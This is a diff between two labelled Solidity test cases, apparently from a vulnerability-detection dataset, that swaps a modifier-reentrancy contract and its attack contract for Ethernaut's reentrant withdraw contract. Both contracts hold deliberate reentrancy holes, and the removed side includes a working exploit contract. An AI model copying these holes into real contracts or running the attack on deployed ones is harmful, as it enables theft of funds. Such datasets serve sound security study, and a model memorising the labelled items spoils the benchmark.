@@ -1,49 +1,32 @@
 /*
- * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
- * @author: - 
- * @vulnerable_at_lines: 15
+ * @source: https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488
+ * @author: Alejandro Santander
+ * @vulnerable_at_lines: 24
  */
 
-pragma solidity ^0.4.24;
+pragma solidity ^0.4.18;
 
-contract ModifierEntrancy {
-  mapping (address => uint) public tokenBalance;
-  string constant name = "Nu Token";
+contract Reentrance {
 
-  //If a contract has a zero balance and supports the token give them some token
-  // <yes> <report> REENTRANCY
-  function airDrop() hasNoBalance supportsToken  public{
-    tokenBalance[msg.sender] += 20;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] += msg.value;
   }
 
-  //Checks that the contract responds the way we want
-  modifier supportsToken() {
-    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
-    _;
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
   }
-  //Checks that the caller has a zero balance
-  modifier hasNoBalance {
-      require(tokenBalance[msg.sender] == 0);
-      _;
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      // <yes> <report> REENTRANCY
+      if(msg.sender.call.value(_amount)()) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
   }
-}
 
-contract Bank{
-    function supportsToken() external pure returns(bytes32){
-        return(keccak256(abi.encodePacked("Nu Token")));
-    }
-}
-
-contract attack{ //An example of a contract that breaks the contract above.
-    bool hasBeenCalled;
-    function supportsToken() external returns(bytes32){
-        if(!hasBeenCalled){
-            hasBeenCalled = true;
-            ModifierEntrancy(msg.sender).airDrop();
-        }
-        return(keccak256(abi.encodePacked("Nu Token")));
-    }
-    function call(address token) public{
-        ModifierEntrancy(token).airDrop();
-    }
+  function() public payable {}
 }
